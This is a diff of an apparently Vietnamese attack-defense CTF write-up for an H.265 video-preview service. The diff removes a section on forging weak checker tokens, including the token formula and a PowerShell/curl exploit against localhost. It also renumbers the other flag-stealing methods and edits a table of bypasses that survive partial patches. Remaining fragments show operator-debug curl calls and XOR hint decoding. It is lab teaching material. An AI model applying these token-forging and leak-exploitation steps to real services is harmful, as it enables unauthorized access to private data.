@@ -609,44 +609,7 @@ for nal in find_nals(data):
         break
 ```
 
-## Hướng 4 - Lấy Cờ Qua Token Checker Yếu
-
-### Khi Nào Dùng Được?
-
-Dùng hướng này khi người chơi biết `case_id` và biết cách checker tạo token. Trong bài hiện tại, nếu flag id được hệ thống truyền cho checker, token có thể được sinh lại từ `case_id`.
-
-Checker tạo token theo công thức cố định:
-
-```text
-sha256("h265-ad-checker-token:" || case_id)[:32]
-```
-
-Nếu attacker thấy `case_id`, attacker tự tính token rồi gọi route hợp lệ:
-
-```text
-POST /api/read
-```
-
-Đây là một hướng web/service rất phù hợp A/D: vá preview H.265 rồi nhưng quên token yếu thì vẫn mất cờ.
-
-### Lệnh Khai Thác
-
-```powershell
-# case_id lấy từ /api/cases, share, manifest hoặc audit.
-$id = "flag_1780132060_da66f92c"
-
-# Token yếu được sinh lại từ case_id bằng đúng công thức checker dùng.
-$token = python -c "import hashlib; i='$id'; print(hashlib.sha256(('h265-ad-checker-token:'+i).encode()).hexdigest()[:32])"
-
-# Gọi route hợp lệ /api/read bằng token vừa tự tính được.
-curl.exe -X POST http://127.0.0.1:8000/api/read `
-  -H "Content-Type: application/json" `
-  -d "{\"id\":\"$id\",\"token\":\"$token\"}"
-```
-
-Nếu route trả `secret`, lấy được flag trực tiếp.
-
-## Hướng 5 - Lấy Cờ Qua Diagnostics Public
+## Hướng 4 - Lấy Cờ Qua Diagnostics Public
 
 ### Khi Nào Dùng Được?
 
@@ -698,7 +661,7 @@ key = stream(case_id, b"h265-ad-diag:")
 print(bytes(byte ^ next(key) for byte in bytes.fromhex(hint)).decode())
 ```
 
-## Hướng 6 - Lấy Cờ Qua Header Thumbnail
+## Hướng 5 - Lấy Cờ Qua Header Thumbnail
 
 ### Khi Nào Dùng Được?
 
@@ -731,7 +694,7 @@ Giải hex giống hướng diagnostics, chỉ đổi nhãn thành:
 h265-ad-thumb:
 ```
 
-## Hướng 7 - Lấy Cờ Qua Operator Debug
+## Hướng 6 - Lấy Cờ Qua Operator Debug
 
 ### Khi Nào Dùng Được?
 
@@ -763,7 +726,7 @@ curl.exe -c cookie.txt -X POST http://127.0.0.1:8000/api/operator/login `
 curl.exe -b cookie.txt http://127.0.0.1:8000/api/operator/cases/flag_1780132060_da66f92c/debug-marker
 ```
 
-## Hướng 8 - Lấy Cờ Từ Preview Cache Cũ
+## Hướng 7 - Lấy Cờ Từ Preview Cache Cũ
 
 ### Khi Nào Dùng Được?
 
@@ -814,10 +777,10 @@ Bảng này giúp đọc bài theo đúng kiểu attack-defense: attacker không
 | Xóa AUD type `35` | Nếu SEI type `39/40` còn `H5DBG`, dùng hướng SEI. |
 | Xóa SEI type `39/40` | Nếu AUD type `35` còn bit giấu, dùng hướng AUD. |
 | Xóa cả AUD và SEI | Nếu vẫn giữ VPS/SPS/PPS từ carrier gốc, dùng hướng parameter set `H5PSET`. |
-| Chỉ lọc H.265 preview | Dùng diagnostics public, thumbnail header, operator debug hoặc token yếu nếu các đường này còn bật. |
+| Chỉ lọc H.265 preview | Dùng diagnostics public, thumbnail header hoặc operator debug nếu các đường này còn bật. |
 | Tắt diagnostics | Thử thumbnail header hoặc operator debug. |
 | Xóa header thumbnail | Thử diagnostics public hoặc operator debug. |
-| Tắt operator debug | Các đường H.265, diagnostics, thumbnail, token yếu vẫn có thể còn sống. |
+| Tắt operator debug | Các đường H.265, diagnostics hoặc thumbnail vẫn có thể còn sống. |
 | Vá code tạo preview mới | Nếu cache cũ chưa xóa hoặc chưa đổi version cache, tải preview cũ rồi khai thác AUD/SEI/parameter set. |
 | Ẩn audit và preview-jobs | Vẫn có thể lấy `case_id` qua `/api/cases`, share hoặc manifest nếu các endpoint đó còn public. |
 | Vá `/api/read` và `/api/carrier` | Chỉ chặn đường private. Nếu preview public hoặc endpoint debug còn leak thì attacker vẫn lấy cờ. |
@@ -826,7 +789,7 @@ Nói gọn:
 
 ```text
 Các endpoint trinh sát chỉ là đường tìm mục tiêu.
-Muốn ra flag, cuối cùng vẫn cần một lỗi thật còn sống: AUD leak, SEI leak, parameter set leak, diagnostics leak, thumbnail header leak, operator debug, token yếu, cache cũ, hoặc private route hở.
+Muốn ra flag, cuối cùng vẫn cần một lỗi thật còn sống: AUD leak, SEI leak, parameter set leak, diagnostics leak, thumbnail header leak, operator debug, cache cũ, hoặc private route hở.
 ```
 
 ## Kết Luận
